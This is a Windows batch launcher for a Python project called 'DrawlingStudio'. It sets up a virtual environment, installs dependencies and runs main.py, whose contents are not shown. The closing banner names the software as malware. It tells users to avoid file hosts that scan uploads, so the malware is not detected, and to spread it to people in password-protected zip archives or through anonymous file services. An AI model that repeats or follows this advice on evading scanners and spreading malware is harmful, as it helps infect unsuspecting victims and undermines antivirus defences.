@echo off
title DrawlingStudio
echo Initializing the virtual environment...
python -m venv drawlingstudio
cls
call drawlingstudio\Scripts\activate.bat
python -m pip install --upgrade pip
pip install -r requirements.txt

python main.py
echo #===============================================================# 
echo #                    Software terminated.                       # 
echo #                                                               # 
echo #   Give us a Star on Github, this would really help us grow!   # 
echo #        https://https://github.com/MNT-W/MNT-REACC             # 
echo #                                                               #
echo #   Also, please don't send this malware using websites like    #
echo # Workupload or googledrive because they will scan the malware  #
echo # and keep track of it and other ocurrences, which will result  #
echo # in more detections in the future, please send it to people in #
echo # a zip archive with a password, or use services like anonfiles #
echo #                                                               #
echo #                         Thank You!                            #
echo #===============================================================# 
echo. 
echo.
pause
